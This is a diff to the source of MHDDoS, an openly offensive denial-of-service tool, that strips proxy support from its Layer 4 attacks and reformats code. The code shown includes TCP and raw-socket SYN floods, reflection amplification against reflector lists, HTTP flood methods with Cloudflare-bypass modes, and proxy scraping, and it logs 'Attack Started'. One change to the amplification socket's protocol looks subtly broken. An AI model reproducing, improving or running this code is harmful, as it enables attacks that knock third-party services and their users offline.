@@ -1,32 +1,36 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
 from itertools import cycle
 from json import load
-from logging import getLogger, shutdown, basicConfig
-from math import trunc, log2
+from logging import basicConfig, getLogger, shutdown
+from math import log2, trunc
 from multiprocessing import RawValue
 from os import urandom as randbytes
 from pathlib import Path
-from random import randint, choice as randchoice
-from socket import (IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, TCP_NODELAY, SOCK_STREAM, AF_INET, socket,
-                    SOCK_DGRAM, SOCK_RAW, gethostname, gethostbyname)
-from ssl import SSLContext, create_default_context, CERT_NONE
-from sys import argv, exit as _exit
-from threading import Thread, Event, Lock
+from random import choice as randchoice
+from random import randint
+from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, SOCK_DGRAM,
+                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
+                    gethostname, socket)
+from ssl import CERT_NONE, SSLContext, create_default_context
+from sys import argv
+from sys import exit as _exit
+from threading import Event, Lock, Thread
 from time import sleep, time
-from typing import Set, List, Any, Tuple
-from PyRoxy import Proxy, Tools as ProxyTools, ProxyUtiles, ProxyType, ProxyChecker
+from typing import Any, List, Set, Tuple
+from urllib import parse
+
 from certifi import where
 from cfscrape import create_scraper
 from icmplib import ping
 from impacket.ImpactPacket import IP, TCP, UDP, Data
-from psutil import process_iter, net_io_counters, virtual_memory, cpu_percent
-from requests import get, Session, exceptions, Response
+from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
+from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
+from PyRoxy import Tools as ProxyTools
+from requests import Response, Session, exceptions, get
 from yarl import URL
-import dns.resolver
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', datefmt="%H:%M:%S")
 logger = getLogger("MHDDoS")
@@ -88,6 +92,7 @@ class Counter(object):
 requests_sent = Counter()
 bytes_sent = Counter()
 
+
 class Tools:
     @staticmethod
     def humanbytes(i: int, binary: bool = False, precision: int = 2):
@@ -125,13 +130,11 @@ class Layer4(Thread):
     _ref: Any
     SENT_FLOOD: Any
     _amp_payloads = cycle
-    _proxies: List[Proxy] = None
 
     def __init__(self, target: Tuple[str, int],
                  ref: List[str] = None,
                  method: str = "TCP",
-                 synevent: Event = None,
-                 proxies: Set[Proxy] = None):
+                 synevent: Event = None):
         super().__init__(daemon=True)
         self._amp_payload = None
         self._amp_payloads = cycle([])
@@ -139,8 +142,6 @@ class Layer4(Thread):
         self._method = method
         self._target = target
         self._synevent = synevent
-        if proxies:
-            self._proxies = list(proxies)
 
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
@@ -149,11 +150,6 @@ class Layer4(Thread):
             with suppress(Exception):
                 while self._synevent.is_set():
                     self.SENT_FLOOD()
-
-    def get_effective_socket(self, conn_type = AF_INET, sock_type = SOCK_STREAM, proto_type = IPPROTO_TCP):
-        if self._proxies:
-            return randchoice(self._proxies).open_socket(conn_type, sock_type, proto_type)
-        return socket(conn_type, sock_type, proto_type)
 
     def select(self, name):
         self.SENT_FLOOD = self.TCP
@@ -190,7 +186,7 @@ class Layer4(Thread):
     def TCP(self) -> None:
         global bytes_sent, requests_sent
         try:
-            with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
+            with socket(AF_INET, SOCK_STREAM) as s:
                 s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                 s.connect(self._target)
                 while s.send(randbytes(1024)):
@@ -203,7 +199,7 @@ class Layer4(Thread):
         global bytes_sent, requests_sent
         payload = b'\x0f\x1f0\t' + self._target[0].encode() + b'\x0fA'
         try:
-            with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
+            with socket(AF_INET, SOCK_STREAM) as s:
                 s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                 s.connect(self._target)
 
@@ -233,7 +229,7 @@ class Layer4(Thread):
         global bytes_sent, requests_sent
         payload = self._genrate_syn()
         try:
-            with self.get_effective_socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
+            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                 while s.sendto(payload, self._target):
                     requests_sent += 1
@@ -246,7 +242,7 @@ class Layer4(Thread):
         global bytes_sent, requests_sent
         payload = next(self._amp_payloads)
         try:
-            with self.get_effective_socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
+            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                 while s.sendto(*payload):
                     requests_sent += 1
@@ -748,21 +744,36 @@ class HttpFlood(Thread):
 
     def select(self, name: str) -> None:
         self.SENT_FLOOD = self.GET
-        if name == "POST": self.SENT_FLOOD = self.POST
-        if name == "CFB": self.SENT_FLOOD = self.CFB
-        if name == "CFBUAM": self.SENT_FLOOD = self.CFBUAM
-        if name == "XMLRPC": self.SENT_FLOOD = self.XMLRPC
-        if name == "BOT": self.SENT_FLOOD = self.BOT
-        if name == "APACHE": self.SENT_FLOOD = self.APACHE
-        if name == "BYPASS": self.SENT_FLOOD = self.BYPASS
-        if name == "OVH": self.SENT_FLOOD = self.OVH
-        if name == "AVB": self.SENT_FLOOD = self.AVB
-        if name == "STRESS": self.SENT_FLOOD = self.STRESS
-        if name == "DYN": self.SENT_FLOOD = self.DYN
-        if name == "SLOW": self.SENT_FLOOD = self.SLOW
-        if name == "GSB": self.SENT_FLOOD = self.GSB
-        if name == "NULL": self.SENT_FLOOD = self.NULL
-        if name == "COOKIE": self.SENT_FLOOD = self.COOKIES
+        if name == "POST":
+         self.SENT_FLOOD = self.POST
+        if name == "CFB":
+         self.SENT_FLOOD = self.CFB
+        if name == "CFBUAM":
+         self.SENT_FLOOD = self.CFBUAM
+        if name == "XMLRPC":
+         self.SENT_FLOOD = self.XMLRPC
+        if name == "BOT":
+         self.SENT_FLOOD = self.BOT
+        if name == "APACHE":
+         self.SENT_FLOOD = self.APACHE
+        if name == "BYPASS":
+         self.SENT_FLOOD = self.BYPASS
+        if name == "OVH":
+         self.SENT_FLOOD = self.OVH
+        if name == "AVB":
+         self.SENT_FLOOD = self.AVB
+        if name == "STRESS":
+         self.SENT_FLOOD = self.STRESS
+        if name == "DYN":
+         self.SENT_FLOOD = self.DYN
+        if name == "SLOW":
+         self.SENT_FLOOD = self.SLOW
+        if name == "GSB":
+         self.SENT_FLOOD = self.GSB
+        if name == "NULL":
+         self.SENT_FLOOD = self.NULL
+        if name == "COOKIE":
+         self.SENT_FLOOD = self.COOKIES
         if name == "PPS":
             self.SENT_FLOOD = self.PPS
             self._defaultpayload = (self._defaultpayload + "Host: %s\r\n\r\n" % self._target.authority).encode()
@@ -806,7 +817,7 @@ class ProxyManager:
 
 
 class ToolsConsole:
-    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}
+    METHODS = {"INFO", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}
 
     @staticmethod
     def checkRawSocket():
@@ -941,35 +952,13 @@ class ToolsConsole:
                                       info["isp"],
                                       info["region"]))
 
-            if cmd == "TSSRV":
-                while True:
-                    domain = input(f'{cons}give-me-domain# ')
-                    if not domain: continue
-                    if domain.upper() == "BACK": break
-                    if domain.upper() == "CLEAR":
-                        print("\033c")
-                        continue
-                    if (domain.upper() == "E") or \
-                            (domain.upper() == "EXIT") or \
-                            (domain.upper() == "Q") or \
-                            (domain.upper() == "QUIT") or \
-                            (domain.upper() == "LOGOUT") or \
-                            (domain.upper() == "CLOSE"):
-                        exit(-1)
-                    domain = domain.replace('https://', '').replace('http://', '')
-                    if "/" in domain: domain = domain.split("/")[0]
-                    print('please wait ...', end="\r")
-
-                    info = ToolsConsole.ts_srv(domain)
-                    logger.info(("TCP: %s\n") % (info['_tsdns._tcp.']))
-                    logger.info(("UDP: %s\n") % (info['_ts3._udp.']))
-
-                    
             if cmd == "PING":
                 while True:
                     domain = input(f'{cons}give-me-ipaddress# ')
-                    if not domain: continue
-                    if domain.upper() == "BACK": break
+                    if not domain:
+                     continue
+                    if domain.upper() == "BACK":
+                     break
                     if domain.upper() == "CLEAR":
                         print("\033c")
                     if (domain.upper() == "E") or \
@@ -1025,7 +1014,7 @@ class ToolsConsole:
                '\n'
                'Example:\n'
                '    Layer7: python3 %s %s %s %s %s proxy.txt %s %s\n'
-               '    Layer4: python3 %s %s %s %s %s proxy.txt') % (argv[0], argv[0],
+               '    Layer4: python3 %s %s %s %s %s') % (argv[0], argv[0],
                                                         ", ".join(Methods.LAYER4_METHODS),
                                                         len(Methods.LAYER4_METHODS),
                                                         ", ".join(Methods.LAYER7_METHODS),
@@ -1047,30 +1036,13 @@ class ToolsConsole:
                                                         randint(1000, 3600)
                                                         ))
 
-    @staticmethod
-    def ts_srv(domain):
-      records = ['_ts3._udp.', '_tsdns._tcp.']
-      DnsResolver = dns.resolver.Resolver()
-      DnsResolver.timeout = 1
-      DnsResolver.lifetime = 1
-      Info = {}
-      for rec in records:
-        try:
-          srv_records=dns.resolver.resolve(rec+domain, 'SRV')
-          for srv in srv_records:
-              Info[rec] = str(srv.target).rstrip('.')+':'+str(srv.port)
-        except:
-          Info[rec] = 'Not found'
-
-      return(Info)
-
-      
     # noinspection PyUnreachableCode
     @staticmethod
     def info(domain):
         with suppress(Exception), get("https://ipwhois.app/json/%s/" % domain) as s:
             return s.json()
         return {"success": False}
+
 
 if __name__ == '__main__':
     with open(__dir__ / "config.json") as f:
@@ -1114,20 +1086,24 @@ if __name__ == '__main__':
                     if len(argv) == 9:
                         logger.setLevel("DEBUG")
 
-                    if not useragent_li.exists(): exit("The Useragent file doesn't exist ")
-                    if not referers_li.exists(): exit("The Referer file doesn't exist ")
+                    if not useragent_li.exists():
+                     exit("The Useragent file doesn't exist ")
+                    if not referers_li.exists():
+                     exit("The Referer file doesn't exist ")
 
                     uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
                     referers = set(a.strip() for a in referers_li.open("r+").readlines())
 
-                    if not uagents: exit("Empty Useragent File ")
-                    if not referers: exit("Empty Referer File ")
+                    if not uagents:
+                     exit("Empty Useragent File ")
+                    if not referers:
+                     exit("Empty Referer File ")
 
-                    if proxy_ty not in {4, 5, 1, 0}: exit("Proxy Type Not Found [4, 5, 1, 0]")
-                    if threads > 1000: logger.warning("thread is higher than 1000")
                     if proxy_ty not in {4, 5, 1, 0}: exit("Socks Type Not Found [4, 5, 1, 0]")
-                    if threads > 1000: logger.warning("Thread is higher than 1000")
-                    if rpc > 100: logger.warning("RPC (Request Pre Connection) is higher than 100")
+                    if threads > 1000:
+                     logger.warning("Thread is higher than 1000")
+                    if rpc > 100:
+                     logger.warning("RPC (Request Pre Connection) is higher than 100")
 
                     if not proxy_li.exists():
                         if rpc > 100: logger.warning("The file doesn't exist, creating files and downloading proxies.")
@@ -1139,10 +1115,10 @@ if __name__ == '__main__':
                             if not Proxies: exit(
                                 "Proxy Check failed, Your network may be the problem | The target may not be"
                                 " available.")
-                            stringBuilder = ""
+                            STRING_BUILDER = ""
                             for proxy in Proxies:
-                                stringBuilder += (proxy.__str__() + "\n")
-                            wr.write(stringBuilder)
+                                STRING_BUILDER += (proxy.__str__() + "\n")
+                            wr.write(STRING_BUILDER)
 
                     proxies = ProxyUtiles.readFromFile(proxy_li)
                     if not proxies:
@@ -1155,7 +1131,8 @@ if __name__ == '__main__':
 
                 if method in Methods.LAYER4_METHODS:
                     target = argv[2].strip()
-                    if ":" in target and not target.split(":")[1].isnumeric(): exit("Invalid Port Number")
+                    if ":" in target and not target.split(":")[1].isnumeric():
+                     exit("Invalid Port Number")
                     port = 53 if ":" not in target else int(target.split(":")[1])
                     threads = int(argv[3])
                     timer = int(argv[4])
@@ -1165,18 +1142,11 @@ if __name__ == '__main__':
                         logger.warning("Port Not Selected, Set To Default: 80")
                     else:
                         target = target.split(":")[0]
-                    proxy_ty = int(argv[6].strip())
-                    proxy_li = Path(__dir__ / "files/proxies/" / argv[5].strip())
-                    proxies = None
-                    if proxy_li.exists():
-                        proxies = ProxyUtiles.readIPPortFromFile(proxy_li)
-                    if not proxies:
-                        logger.info("Empty Proxy File, Running layer 4 witout proxy")
-                        proxies = None
-                    if proxies:
-                        logger.info(f"Proxy Count: {len(proxies):,}")
-                    if 65535 < port or port < 1: exit("Invalid Port [Min: 1 / Max: 65535] ")
-                    if not ProxyTools.Patterns.IP.match(target): exit("Invalid Ip Selected")
+
+                    if port > 65535 or port < 1:
+                     exit("Invalid Port [Min: 1 / Max: 65535] ")
+                    if not ProxyTools.Patterns.IP.match(target):
+                     exit("Invalid Ip Selected")
                     if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
                             not ToolsConsole.checkRawSocket(): exit("Cannot Create Raw Socket ")
 
@@ -1185,15 +1155,18 @@ if __name__ == '__main__':
                             if len(argv) == 7:
                               logger.setLevel("DEBUG")
                             refl_li = Path(__dir__ / "files" / argv[5].strip())
-                            if not refl_li.exists(): exit("The Reflector file doesn't exist ")
-                            ref = set(a.strip() for a in ProxyTools.Patterns.IP.findall(refl_li.open("r+").read()))
-                        if not ref: exit("Empty Reflector File ")
+                            if not refl_li.exists():
+                             exit("The Reflector file doesn't exist ")
+                            ref = set(a.strip()
+                            for a in ProxyTools.Patterns.IP.findall(refl_li.open("r+").read()))
+                        if not ref:
+                         exit("Empty Reflector File ")
                     else:
                         if len(argv) == 6:
                             logger.setLevel("DEBUG")
 
                     for _ in range(threads):
-                        Layer4((target, port), ref, method, event,proxies).start()
+                        Layer4((target, port), ref, method, event).start()
 
                 logger.info("Attack Started to %s with %s method for %s seconds, threads: %d!" %
                             (target or url.human_repr(), method, timer, threads))
